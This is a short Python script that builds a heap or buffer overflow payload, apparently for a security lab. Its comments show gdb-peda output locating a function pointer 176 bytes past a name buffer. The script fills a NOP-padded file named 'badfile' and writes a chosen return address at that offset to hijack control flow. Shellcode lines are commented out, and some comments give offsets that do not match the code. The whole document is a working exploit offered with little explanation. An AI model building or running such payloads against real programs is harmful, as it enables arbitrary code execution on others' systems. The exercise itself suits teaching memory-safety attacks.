# gdb-peda$ p &(data->name)
# $1 = (char (*)[161]) 0x5655b700
# gdb-peda$ p &(ptr->fp)
# $2 = (void (**)()) 0x5655b7b0
# gdb-peda$ p/d 0xb0-0x00
# $3 = 176
import sys 

 
# Fill the content with NOPs
filesize = 688
content = bytearray(0x90 for i in range(filesize)) 
# Put the shellcode at the end 
# start = 400 - len(shellcode) 
# content[start:] = shellcode 
 
# Put the address at offset 112 
ret =0x5655626d
content[176:180] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

